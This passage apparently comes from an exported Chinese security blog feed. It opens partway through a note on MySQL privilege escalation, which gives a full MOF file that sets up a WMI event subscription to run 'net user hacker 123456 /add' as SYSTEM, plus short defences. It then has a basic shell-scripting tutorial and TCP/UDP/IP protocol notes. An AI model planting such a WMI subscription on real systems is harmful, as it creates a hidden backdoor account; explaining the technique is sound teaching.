<p>mof文件代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pragma <span class="title function_ invoke__">namespace</span>(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter <span class="keyword">as</span> <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>;</span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>;</span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span></span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>;</span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer <span class="keyword">as</span> <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>;</span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>;</span><br><span class="line">    ScriptText =</span><br><span class="line">    <span class="string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;**net user hacker 123456 /add**\&quot;)&quot;</span>;</span><br><span class="line">    <span class="comment">//cmd以system权限执行的语句</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = <span class="variable">$Consumer</span>;</span><br><span class="line">    Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>标红部分是我们要执行的命令，先添加用户，在将用户添加到管理员组中。</p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>限制mysql的访问</p>
<p>不要以root用户身份登录</p>
<p>设置该目录为不可写</p>
<h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><h1 id="yassh溢出"><a href="#yassh溢出" class="headerlink" title="yassh溢出"></a>yassh溢出</h1><h1 id="登录失败直接进入mysql"><a href="#登录失败直接进入mysql" class="headerlink" title="登录失败直接进入mysql"></a>登录失败直接进入mysql</h1>]]></content>
      <categories>
        <category>安全技术</category>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
        <tag>PHP</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell编程</title>
    <url>/archives/6309c3f8.html</url>
    <content><![CDATA[<h1 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h1><h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>使用普通的文本编辑器即可编写,这里创建一个a.sh的shell脚本</p>
<p>开头第一行为 ： #! &#x2F;bin&#x2F;bash &#x2F;&#x2F;目录表示shell类型</p>
<p>执行方法： cd到文件所在目录，.&#x2F;a.sh &#x2F;&#x2F;注意不可直接写a.sh，如果这样写系统会到环境变量的path项中添加的目录中去寻找该文件执行，因为往往我们的shell脚本并没有在这些目录里面则系统无法找到该文件。</p>
<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure>

<p>等号两端不能有空格</p>
<h2 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!&quot;</span></span><br></pre></td></tr></table></figure>

<p>{}用于定义变量边界</p>
<h2 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> var</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!</span></span><br><span class="line"><span class="string">var=&quot;</span>hejixiong<span class="string">&quot;  #修改只读变量会报错</span></span><br></pre></td></tr></table></figure>

<h2 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">unset</span> var</span><br></pre></td></tr></table></figure>

<p>不能删除只读变量</p>
<h2 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h2><p>**局部变量：**shell脚本中定义的变量，只能在脚本中使用</p>
<p>**环境变量：**所有的程序，包括shell启动的程序都可以访问环境变量</p>
<p>**shell变量：**由shell程序设置的特殊变量，有一部分是环境变量有一部分是局部变量</p>
<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>可以使用单引号也可以使用双引号</p>
<p>单引号中的内容原样输出</p>
<p>双引号中的内容可以包含变量，</p>
<p>\ 为转义标志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nihao&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao \&quot;<span class="variable">$&#123;var&#125;</span>\&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#var&#125;</span> <span class="comment">#输出8</span></span><br></pre></td></tr></table></figure>

<p>提取子字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;var:1:3&#125;</span> <span class="comment"># 输出rma</span></span><br></pre></td></tr></table></figure>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>通过下标访问，下标的开始值为0，只有一维数组，且无大小限制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array1=(1 2 3 45 56 43)</span><br><span class="line">array2=(</span><br><span class="line">1 </span><br><span class="line">2 </span><br><span class="line">3 </span><br><span class="line">45 </span><br><span class="line">56 </span><br><span class="line">43</span><br><span class="line">)</span><br><span class="line"><span class="built_in">declare</span> -A array4 <span class="comment">#声明数组</span></span><br><span class="line">array3[0]=1</span><br><span class="line">array3[1]=134</span><br><span class="line">array3[2]=145</span><br><span class="line">array4[234]=44</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[0]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[@]&#125;</span> <span class="comment">#获取数组中所有元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取数组长度</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array=(1 2 3 45 56 43)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[@]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[*]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[n]&#125;</span> <span class="comment">#获取数组中某个元素的长度</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>多行注释</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>参数传递</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 文件名a.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;脚本名为<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数为<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数为<span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个参数为<span class="variable">$3</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>chmod +x a.sh</p>
<p>.&#x2F;a.sh 12 “hjx” ‘red’</p>
<p><a href="Untitled%20521b7c9be779487aaeb0ad68a1ad16fa.csv">Untitled</a></p>
<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=10</span><br><span class="line"><span class="variable">$b</span>=12</span><br><span class="line"><span class="keyword">if</span> [<span class="variable">$a</span> -gt <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> + <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="variable">$a</span> -eq <span class="variable">$b</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> - <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> \* <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">ls</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> (i=1;i&lt;10;i++);<span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int=1</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$int</span>&lt;=<span class="number">5</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$int</span></span><br><span class="line">	<span class="built_in">let</span> <span class="string">&quot;int++&quot;</span> <span class="comment">#使用let命令，在变量计算中就不需要加上$</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="until"><a href="#until" class="headerlink" title="until"></a>until</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=0</span><br><span class="line"><span class="keyword">until</span> [! <span class="variable">$a</span> -lt 10]</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">	a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>当条件不成立的时候执行代码块</p>
<p>当条件成立时跳出循环，与while正好相反</p>
<h2 id="case-…-esac"><a href="#case-…-esac" class="headerlink" title="case … esac"></a>case … esac</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> num</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$num</span> <span class="keyword">in</span></span><br><span class="line">	1) <span class="built_in">echo</span> <span class="string">&#x27;你选择了1&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	2) <span class="built_in">echo</span> <span class="string">&#x27;你选择了2&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	*) <span class="built_in">echo</span> <span class="string">&#x27;请正常输入&#x27;</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;这是一个函数&#x27;</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">	<span class="built_in">return</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">test</span> 1 2</span><br><span class="line">func=<span class="keyword">function</span>&#123;</span><br><span class="line">	<span class="comment">#body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h1><p><a href="Untitled%20569327758ca8421ebe2a12f906547f30.csv">Untitled</a></p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>. filename</p>
<p>source filename</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>Shell编程</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP-UDP-IP学习</title>
    <url>/archives/eecf3b2.html</url>
    <content><![CDATA[<h1 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h1><p>本部分笔记笔记参考网址：</p>
<p><a href="https://www.cnblogs.com/zmlctt/p/3690998.html">TCP三次握手四次挥手详解 - zmlctt - 博客园</a></p>
<p><a href="https://baike.baidu.com/item/TCP/33012">TCP（传输控制协议）_百度百科</a></p>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>TCP: 传输控制协议，工作在osi七层模型的传输层上，是一种面向连接的协议，负责端对端网络连接的建立，进程间通信，流量控制、数据校验等功能</p>
<p>SYN:同步序列编号，Synchronize Sequence Numbers</p>
<p>2MSL:2 Maximum Segment Lifetime 2倍报文最大生存时间。</p>
<h2 id="首部格式"><a href="#首部格式" class="headerlink" title="首部格式"></a>首部格式</h2><p>首部最长为60个字节，最短为20个字节—当首部中无选项字段时。</p>
<p>Source Port———源端口，16bits,0-65535<br>Destination Port ————目的端口，16bits,0-65535</p>
<p>Sequence Number————发送数据包中第一个分段的序列号，32bits</p>
<p>Acknowledgement Number—————-确认序列号，32bits</p>
<p>Data Offsset ————数据偏移，32bits，该字段的值是TCP首部长度除以4，用以指定TCP报文段的数据部分起始位置距离TCP报文段的起始位置有多远，该选项存在的意义是tcp首部中存在长度不确定的Options。</p>
<p>标志位———-6bits：</p>
<p>第一位：URG—表示Urgent Pointer字段有意义</p>
<p>第二位：ACK—表示Acknowledgement Numbber 字段有意义</p>
<p>第三位：PUSH—-表示push功能，当两个应用程序通信时，某一端如果希望当前数据中包含的指令得到尽快的响应，则此时将该数据段的push标志位设置为1，当接受方收到该数据段后，不是将该报文段放置在缓存中排队输送到应用程序，而是立即将其提交到接受方应用程序。</p>
<p>第四位：RST—复位TCP连接，当tcp连接中出现了严重的差错时，将该值设置为1，此时表示要重新建立TCP连接。</p>
<p>第五位：SYN——表示SYN报文</p>
<p>第六位：FIN——表示没有数据可以发送了</p>
<p>Window——表示接受缓冲区的空闲空间，16bits，用来告诉TCP接受对端自己能够接受逇最大数据长度</p>
<p>Checksum——校验和，16bits。在计算校验和时，要在TCP首部的前面加上12个字节的伪首部。</p>
<p>Urgent Pointers ——紧急指针，16位， 只有URG标志位被设置时该字段才有意义，表示紧急数据相对序列号（Sequence Number字段的值）的偏移。表明当前连接中有紧急字段需要发送，此时tcp将该报文段插入到报文段队列的最前方，优先发送</p>
<h2 id="伪首部格式"><a href="#伪首部格式" class="headerlink" title="伪首部格式"></a>伪首部格式</h2><p>本部分参考网址：</p>
<p><a href="https://blog.csdn.net/jiangqin115/article/details/39315085">TCP,UDP伪首部描述_jiangqin115的专栏-CSDN博客_udp伪首部</a></p>
<p>Source IP——源IP地址，32bits</p>
<p>Destination Ip ———目的IP地址，32bits</p>
<p>填充位———8bits,均填充为0</p>
<p>Protocol———协议位，使用协议的协议号，8bits，tcp为6</p>
<p>Data Segment Length ———数据段长度，16bits</p>
<p>首部并非TCP&amp;UDP数据报中实际的有效成分。伪首部是一个虚拟的 数据结构，其中的信息是从数据报所在IP分组头的分组头中提取的，既不向下传送也不向上递交，而仅仅是为计算 校验和。这样的 校验和，既校验了TCP&amp;UDP用户数据的源 端口号和目的端口号以及TCP&amp;UDP用户数据报的数据部分，又检验了IP数据报的源IP地址和目的地址。伪报头保证TCP&amp;UDP数据单元到达正确的目的地址。因此，伪报头中包含IP地址并且作为计算 校验和需要考虑的一部分。最终目的端根据伪报头和 数据单元计算 校验和以验证通信数据在传输过程中没有改变而且到达了正确的目的地址。</p>
<h2 id="TCP连接建立与终止"><a href="#TCP连接建立与终止" class="headerlink" title="TCP连接建立与终止"></a>TCP连接建立与终止</h2><h3 id="建立连接-3次握手"><a href="#建立连接-3次握手" class="headerlink" title="建立连接-3次握手"></a>建立连接-3次握手</h3><p>TCP三次握手：</p>
<ol>
<li>客户端发送SYN(Seq&#x3D;x，初始序号，存储在报头的Sequence Number中)，SYN标志位为1，ACK标志位为0，的报文给服务器端，进入SYN_SEND状态</li>
<li>服务器接收到SYN报文，回应一个SYN(seq&#x3D;y)+ACK（ACK &#x3D; x+1），SYN与ACK标志位同时为1的报文给客户端，进入SYN_RECV状态。</li>
<li>客户端收到服务器端的SYN报文，回应一个ACK(ACK&#x3D;y+1)，SYN标志位为0，ACK标志位为1的包给服务器，进入established状态。</li>
</ol>
<p>至此，TCP客户端与服务器端的连接被建立起来，可以进行相互间的数据传输了</p>
<p><img src="/archives/eecf3b2/111.png"></p>
<ol>
<li>某个应用进程首先调用close,称该端执行“主动关闭”，该端的TCP于是发送一个FIN分节，表示数据发送完毕,此时主动方将关闭发送服务。</li>
<li>接受到这个FIN的对端执行“被动关闭”，这个FIN由TCP确认，发送ACK包给主动方。FIN的接收也作为一个文件结束符（end-of-file）传递给接收端应用进程，放在已排队等候该应用进程接收的任何其他数据之后，因为，FIN的接收意味着接收端应用进程在相应连接上再无额外数据可接收。</li>
<li>一段时间后，接受到这个文件结束符的应用进程将调用close关闭它的套接字。这导致他的tcp也发送一个FIN+ACK，进入LAST-ACK状态。</li>
<li>接受端接受到这个FIN后，其TCP确认这个FIN向被动方发送ACK包。从而进入TIME_WAIT状态。等待2MSL之后，如不再有新的ACK+FIN包传来，则主动方关闭接收服务（被动方若超过msl之后仍没有收到确认包，则会重发FIN_ACK包，主动方在2msl之后再关闭服务则能确保能够收到来自被动方的重发包）。</li>
</ol>
<p><img src="/archives/eecf3b2/100327022731.jpg"></p>
<h2 id="可靠性实现"><a href="#可靠性实现" class="headerlink" title="可靠性实现"></a>可靠性实现</h2><h3 id="重传策略"><a href="#重传策略" class="headerlink" title="重传策略"></a>重传策略</h3><p>TCP在发送一个数据段后立即启动一个定时器，如果在重传超时时间内接收到确认就关闭该重传，如果未接收到确认，则重传该数据段。</p>
<h3 id="可靠性"><a href="#可靠性" class="headerlink" title="可靠性"></a>可靠性</h3><ol>
<li>校验和：TCP将保持他首部和数据的校验和。这是一个端到端的校验和，目的是检测数据在传输过程中的任何变化。如果收到段的校验和有差别，TCP将丢弃这个报文段并且不确认这段报文。</li>
<li>数据包顺序：通过IP数据报的方式传送，因为路由选择的不同可能在成数据包的失序。报文头中的Sequence Number就是接受端重新进行包排序的依据，也是删除重复包的依据</li>
<li>流量控制：TCP接受端都有固定大小的缓冲空间，双方通过SYN中的MSS协商发送、接受数据的大小，从而防止缓冲区的溢出。</li>
</ol>
<h3 id="窗口确认"><a href="#窗口确认" class="headerlink" title="窗口确认"></a>窗口确认</h3><p>使用数据报头序列号及确认号来确认已收到包含在数据段的相关的数据字节。</p>
<p>源主机在收到确认消息之前可以传输的数据的大小称为窗口大小</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="MSS协商"><a href="#MSS协商" class="headerlink" title="MSS协商"></a>MSS协商</h3><p>在TCP建立连接的三次握手中，有一种很重要的工作那就是进行MSS协商。连接的双方都在SYN报文中增加MSS选项，其选项值表示本端最大能接收的段大小，即对端最大能发送的段大小。连接的双方取本端发送的MSS值和接收对端的MSS值的较小者作为本连接最大传输段大小。</p>
<p>发送SYN报文时的MSS选项值的计算方法如下。</p>
<p>l非直连网络中：mss &#x3D; 默认值536。</p>
<p>l直连网络中：mss &#x3D; 对端ip地址对应的出口的MTU - 20字节ip头 - 20字节tcp头。</p>
<p>若连接过程中发送端或者接受端协商的MSS超过路由器允许的最大值，路由器则会拒绝转发。怎么解决这个问题呢，在tcp连接的建立过程中进行syn协商时，路由器会进行解包，如果发现mss超过限制，则会对该值进行修改，再重新封装发送。</p>
<h3 id="PMTU发现"><a href="#PMTU发现" class="headerlink" title="PMTU发现"></a>PMTU发现</h3><p>PMTU:路径最大传输单元。</p>
<p>当设备发现当前的PMUT比双方协商的mss小时，则设备就会按一定的时间间隔去尝试发现更大的PMTU,指导PMTU达到最大值。</p>
<h3 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a>SYN攻击</h3><p>在三次握手的过程中，服务方在接受了请求方的SYN后发送SYN+ACK回报，同时进入SYN_RECV状态，若在设置的时间阈值之后仍然没有收到请求方的ACK包，则服务方将重发SYN+ACK包，知道达到设定的重发次数为止。SYN攻击则是利用这一过程，使用大量的虚假IP不断的发起SYN请求却不发送ACK回包，这样这些伪造的SYN包将占用未连接队列，使正常的SYN请求被丢弃，导致目标系统运行缓慢，甚至导致网络堵塞或系统瘫痪。</p>
<h3 id="主动方最后发送ACK包后为什么需要进入TIME-WAIT状态？TIME-WAIT状态的持续时间为什么是2MSL"><a href="#主动方最后发送ACK包后为什么需要进入TIME-WAIT状态？TIME-WAIT状态的持续时间为什么是2MSL" class="headerlink" title="主动方最后发送ACK包后为什么需要进入TIME_WAIT状态？TIME_WAIT状态的持续时间为什么是2MSL"></a>主动方最后发送ACK包后为什么需要进入TIME_WAIT状态？TIME_WAIT状态的持续时间为什么是2MSL</h3><p>当主动方发送了最后的ACK包后，并不能完全确保被动方接收到了该包。如果该包在传输过程中发生了丢失，那么被动方在等待了设定的超时响应时间之后则会重传FIN包，此时主动方是处于TIME_WAIT状态的，在2msl时间内则是为了确保主动方能够接收到被动方重发的FIN包。这样可以确保TCP全双工连接的可靠终止，同时也能确保老的重复的分节在网络中消逝，主动方在等待2MSL之后就可以上使所有在连接过程中产生的报文段在网络中消失，因为处于TIME_WAIT状态的分节是不允许绑定的。</p>
<h3 id="为什么需要进行三次握手，两次握手可以吗"><a href="#为什么需要进行三次握手，两次握手可以吗" class="headerlink" title="为什么需要进行三次握手，两次握手可以吗"></a>为什么需要进行三次握手，两次握手可以吗</h3><p>不可以，两次握手可能造成死锁。当请求方发送SYN后，服务方回ACK+SYN包，按照两次握手的情况，如果服务方的ACK包在发送过程中丢失，服务方自己却不知情，在发送了ACK包后，他就开始传送数据，请求方因为未收到来自服务提供方的ACK包，那么将一直处于SYN_SEND状态，服务方发过来的正常数据包将被请求方丢弃，而服务方则因为自己发送的数据包未收到来自请求方的确认包，分组超时后将重发相同的分组，从而造成死锁。</p>
<h1 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h1><p>本部分笔记参考网址：</p>
<p><a href="https://baike.baidu.com/item/UDP">UDP_百度百科</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/101552588">不为人知的UDP：深入地理解UDP协议并用好它</a></p>
<h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><p>UDP:用户数据包协议。是一种面向事务的，连接不可靠的传输层协议。不能提供数据的分组、组装、排序，因为首部简短，所额外开销据较少，流量的开销较少，在传输过程中的延迟小，数据的传输效率高，适合对可靠性要求不高的程序。特别适用于发送那些简短的数据，同时UDP协议是一种一对多的协议，所以在直播领域、视频会议领域，多媒体数据的传输等方面多使用。其可靠性与分组都有应用层完成，如DNS、TFTP、SNMP等协议</p>
<h2 id="UDP报头"><a href="#UDP报头" class="headerlink" title="UDP报头"></a>UDP报头</h2><p>总共8个字节，分为4个域，每个域2个字节。</p>
<p>Source Port ———源端口，16bits,0-65535</p>
<p>Destination Port———目的端口,16bits,0-65535</p>
<p>数据长度———16bits,UDP报文段的长度，最短为8（仅首部）</p>
<p>Checksum———16bits，整个数据段的校验和，接受端接受到该报文段后，计算校验和，若计算出的校验和与该值相等则保留该数据段，若不相等则丢弃该数据段。该值不是必须的。</p>
<h3 id="UDP伪报头"><a href="#UDP伪报头" class="headerlink" title="UDP伪报头"></a>UDP伪报头</h3><p>Source IP——源IP地址，32bits</p>
<p>Destination Ip ———目的IP地址，32bits</p>
<p>填充位———8bits,均填充为0</p>
<p>Protocol———协议位，使用协议的协议号，8bits，UDP为17</p>
<p>Data Segment Length ———数据段长度，16bits</p>
<p>首部并非TCP&amp;UDP数据报中实际的有效成分。伪首部是一个虚拟的 数据结构，其中的信息是从数据报所在IP分组头的分组头中提取的，既不向下传送也不向上递交，而仅仅是为计算 校验和。这样的 校验和，既校验了TCP&amp;UDP用户数据的源 端口号和目的端口号以及TCP&amp;UDP用户数据报的数据部分，又检验了IP数据报的源IP地址和目的地址。伪报头保证TCP&amp;UDP数据单元到达正确的目的地址。因此，伪报头中包含IP地址并且作为计算 校验和需要考虑的一部分。最终目的端根据伪报头和 数据单元计算 校验和以验证通信数据在传输过程中没有改变而且到达了正确的目的地址。</p>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h3 id="UDP报文段数据部分长度"><a href="#UDP报文段数据部分长度" class="headerlink" title="UDP报文段数据部分长度"></a>UDP报文段数据部分长度</h3><ul>
<li><p>UDP数据包数据段的理论最大长度：</p>
<ol>
<li>udp协议本身规定了其有16位的报文长度，则其报文长度不能超过2^16&#x3D;65536。</li>
<li>报头占8字节</li>
<li>IP报头占20字节</li>
</ol>
<p>  则其理论长度为：65536-1-8-20&#x3D;65507字节。
  </p>
</li>
<li><p>实际最大长度：</p>
<ol>
<li>UDP发送缓存区大小限制</li>
<li>以太网发送数据帧的长度限制</li>
<li>数据链路层MTU限制</li>
</ol>
</li>
<li><p>理想长度：</p>
<p>  受以太网传输电气方面的限制，每个以太网帧最小字节为64，最大为1518字节，超过这个范围的帧均被视为错误真丢弃，在减掉以太网帧的帧头部分（DMAC目的 MAC 地址48bit&#x3D;6Bytes+SMAC源 MAC 地址48bit&#x3D;6Bytes+Type域（上层协议类型，用以接收端判断将数据部分上送到哪一种协议-icmp,ip,arp）2bytes）共14字节，和帧尾部分的CRC—-循环冗余校验部分，能够承载上层协议的数据域最大只能为1500字节，即为MTU。那么要想IP层不分包，那么UDP数据包的最大值为1500-20-8&#x3D;1472字节。鉴于Internet的标准MTU值为576字节，故建议UDP的数据长度控制在（576-8-20&#x3D;548字节）以内。</p>
<p>  采用冗余传输方案：延时双发-将原本单发的前后连续的两个包合并成一个大包发送。</p>
</li>
</ul>
<h3 id="如何获取完整的UDP包"><a href="#如何获取完整的UDP包" class="headerlink" title="如何获取完整的UDP包"></a>如何获取完整的UDP包</h3><p>采用冗余传输方案：延时双发-将原本单发的前后连续的两个包合并成一个大包发送。</p>
<p><img src="/archives/eecf3b2/30193705-accbdcad601c4d45b96392feea1bb63a.png"></p>
<h1 id="IPv4协议"><a href="#IPv4协议" class="headerlink" title="IPv4协议"></a>IPv4协议</h1><p>本部分笔记参考：</p>
<p><a href="https://www.cnblogs.com/red-code/p/7132023.html">Red_Code</a></p>
<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>IP:Internet Protocol，网际互连协议，其工作在OSI参考模型的网络层上，提供一种无连接的、不可靠的、尽力而为的数据包传输服务。</p>
<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><h3 id="IP分组转发规则"><a href="#IP分组转发规则" class="headerlink" title="IP分组转发规则"></a>IP分组转发规则</h3><ul>
<li><p>直接交付：</p>
<p>  当IP数据包经由路由器转发时，如果目标设备与本地路由器直接相连，则直接将数据包交付给目标主机</p>
</li>
<li><p>间接交付</p>
<p>  若目标主机未与本地路由器直接相连，路由器通过查找路由表，并将数据包转交给路由表中指明的下一跳路由器。若路由表中有到达目标网络的路由，则吧数据包传送给指明的吓一跳路由器，如果没有路由，则将数据包传送给路由表中的默认路由。如果两者都没有则丢弃数据包并报告错误</p>
</li>
</ul>
